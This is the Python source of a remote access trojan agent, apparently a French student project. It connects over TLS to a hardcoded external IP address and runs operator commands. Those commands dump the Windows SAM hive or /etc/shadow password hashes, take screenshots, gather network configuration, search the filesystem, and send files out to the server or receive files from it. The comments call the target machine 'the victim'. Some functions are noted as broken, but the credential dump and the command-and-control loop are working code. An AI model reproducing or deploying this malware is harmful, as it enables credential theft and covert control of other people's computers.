# Description: Serveur pour le projet Python RAT
# Authors: Dorin MUNCIULENU, Mikaël (rentre ton nom de fa;mille) 4SI4
# Date: 31/01/2024 23h59 depassé

import socket
import ssl
import subprocess
import platform # Pour obtenir le nom du système d'exploitation
import os # pour les appels système

# Importer mss pour la capture d'écran
import mss
import mss.tools
# Fonctions get_hashdump, screenshot, get_ipconfig, search inchangées


from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID
import datetime

def generate_key():
    """Génère une clé privée RSA."""
    return rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

def generate_cert(subject_name, issuer_name, private_key):
    """Génère un certificat auto-signé."""
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "FR"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Some-State"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, subject_name),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "My Organization"),
        x509.NameAttribute(NameOID.COMMON_NAME, issuer_name),
    ])

    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        private_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=3650)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(issuer_name)]),
        critical=False,
    ).sign(private_key, hashes.SHA256())

    return cert

def save_cert_and_key(cert, key, cert_path, key_path):
    """Sauvegarde le certificat et la clé dans des fichiers."""
    with open(cert_path, "wb") as cert_file:
        cert_file.write(cert.public_bytes(serialization.Encoding.PEM))

    with open(key_path, "wb") as key_file:
        key_file.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))

def need_certif(cert_path, key_path, name):
    """Vérifie si le certificat et la clé existent, les génère sinon."""
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        print(f"Création du certificat et de la clé pour {name}...")
        key = generate_key()
        cert = generate_cert(name, name, key)
        save_cert_and_key(cert, key, cert_path, key_path)


# fonctionne sur Windows et Linux maintennt !! (youpi)
def get_hashdump():
    os_name = platform.system().lower()
    
    try:
        if os_name == "windows":
            sam_path = "C:\\Windows\\System32\\config\\SAM"
            # reg save pour sauvegarder la SAM dans un fichier (on suppose que c'est executé comme admin)
            subprocess.check_output(["reg", "save", "HKLM\\SAM", sam_path, "/y"], encoding='utf-8')
            with open(sam_path, "rb") as sam_file:
                return sam_file.read()
        elif os_name in ["linux"]:
            shadow_path = "/etc/shadow"
            with open(shadow_path, "r") as shadow_file:
                return shadow_file.read()
        else:
            return "Error_US"  # US: Unknown system
    except subprocess.CalledProcessError as e:
        return "ERROR_CMAND"  # CMAND: Command error
    except FileNotFoundError:
        return "Error_NF"  # NF: Not found
    except PermissionError:
        return "Error_PD"  # PD: Permission denied
    except Exception:
        return "Error_UK"  # UK: Unknown error	


# inspiré de https://python-mss.readthedocs.io/examples.html et https://stackoverflow.com/questions/71453766/how-to-take-a-screenshot-from-part-of-screen-with-mss-python
# Le but est d'utiliser la fonction download pour telecharger ensuite l'image sur le serveur et supprimer sur l'agent
def screenshot():
    # Vérifier si l'environnement a une interface graphique en renvoyant true si pas windows( != 'nt')
    # et si la variable d'environnement DISPLAY n'est pas vide
    if os.environ.get('DISPLAY', '') == '' and os.name != 'nt':
        print("Aucune interface graphique détectée. La capture d'écran n'est pas possible.")
        return "Error_NDD" # NDD: no display detected pour un envoi de message d'erreur plus simpl

    with mss.mss() as sct:
        filename = os.path.join(os.getcwd(), 'screenshot.png')
        sct.shot(output=filename)
        #send_file(client_socket, "screenshot.png")
        return "OK" # On retourne ok car la fonction download ne fonctionne pas masi voici le code que ca aurait donné

# Code inspiré de https://stackoverflow.com/questions/45653856/how-to-open-cmd-and-run-ipconfig-in-python
# Corrigée pour fonctionner sur Windows aussi
def get_ipconfig():
    """Obtient la configuration réseau de la victime."""
    os_name = platform.system().lower()
    
    try:
        if os_name == "windows":
            result = subprocess.check_output("ipconfig", encoding='cp437')
        elif os_name in ["linux"]:
            result = subprocess.check_output(["ip", "addr", "show"], encoding='utf-8')  # équivalent plus stable de ip a
        else:
            return "Error_US"  # US: Unknown system
    except subprocess.CalledProcessError:
        return "ERROR_CMAND"  # CMAND: Command error
    return result

# 
def search(filename):
    """Recherche un fichier """
    for root, dirs, files in os.walk('/'):
        if filename in files:
            return os.path.join(root, filename)
    return "ERROR_NF"  # NF: Not found


# Ne fonctionne pas correctement malheureusement
def send_file(socket, file_path):
    """Envoie un fichier au serveur"""
    try:
        with open(file_path, 'rb') as file:
            socket.sendall(f"download {os.path.basename(file_path)}".encode('utf-8')) 
            while True:
                bytes_read = file.read(1024)
                if not bytes_read:
                    # Fichier entièrement lu, signaler la fin du fichier
                    socket.sendall(b"END_OF_FILE")
                    break
                socket.sendall(bytes_read)
        print(f"Fichier {file_path} envoyé avec succès.")
    except FileNotFoundError:
        print("Le fichier spécifié n'existe pas.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")


# il faut avoir server_cert.pem dans le même dossier que le script
def create_secure_socket():
    """Crée un socket sécurisé pour la communication avec le serveur."""
    # Assurez-vous que les certificats et les clés existent pour le client
    need_certif("client_cert.pem", "client_key.pem", "Client")
    
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations('server_cert.pem')  # Utilisez le certificat du serveur
    context.check_hostname = False  # Dépend de votre configuration
    connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname='SERVER_HOSTNAME')
    return connection


def connect_to_server(host, port):
    """Se connecte au serveur."""
    try:
        secure_socket = create_secure_socket()
        secure_socket.connect((host, port))
        return secure_socket
    except Exception:
        return "ERROR_UK"  # UK: Unknown error

def send_data(socket, data):
    """Envoie des données au serveur. Le nom de la fonction veut tout dire !"""
    socket.sendall(data.encode('utf-8'))

# V1
# def receive_commands(socket):
#     while True:
#         data = socket.recv(1024).decode('utf-8')
#         if data:
#             print(f"Commande reçue : {data}")
#             execute_command(data, socket)
#         else:
#             break

def receive_commands(socket):
    """Reçoit les commandes du serveur et exécute les commandes."""
    while True:
        data = socket.recv(1024)
        command = data.decode('utf-8', errors='ignore')  # Utiliser errors='ignore' pour éviter les erreurs de décodage(pour windows notamment)
        
        if command.startswith("download"):
            filename = command.split(" ", 1)[1]  # Extrait le nom du fichier de la commande
            send_file(client_socket, filename)

        if command.startswith("START_FILE_UPLOAD"):
            file_name = command.split(":", 1)[1].strip()
            with open(file_name, 'wb') as file:
                while True:
                    part = socket.recv(1024)
                    if part.endswith(b"END_OF_FILE"):
                        file.write(part[:-len(b"END_OF_FILE")])  
                        break
                    file.write(part)
            print(f"Fichier {file_name} reçu.")
        elif "ERROR: File not found." in command or "ERROR: File upload failed." in command:
            print(command)
        else:
            print(f"Commande reçue : {command}")
            execute_command(command, socket)

        


def execute_command(command, socket):
    """Exécute une commande et envoie la réponse au serveur."""

    if command == "ipconfig":
        response = get_ipconfig()

    elif command.startswith("search"):
        _, search_query = command.split(" ", 1)
        response = search(search_query)

    elif command == "screenshot":
        response = screenshot()

    elif command == "hashdump":
        response = get_hashdump()
        send_data(socket, response)

    elif command == "exit":
        print("Fermeture de la connexion.")
        socket.close()
        exit(0)

    elif command == "START_FILE_UPLOAD":
        print("Je vais recevoir un fichier")
        
    else:
        response = "help"
    
    # Gérer la réponse en morceaux si elle dépasse 1024 caractères
    for i in range(0, len(response), 1024):
        send_data(socket, response[i:i+1024])
    
    send_data(socket, "END_OF_RESPONSE")




if __name__ == "__main__":
    HOST, PORT = '82.66.54.225', 51821
    client_socket = connect_to_server(HOST, PORT)
    if client_socket:
        receive_commands(client_socket)
        client_socket.close()
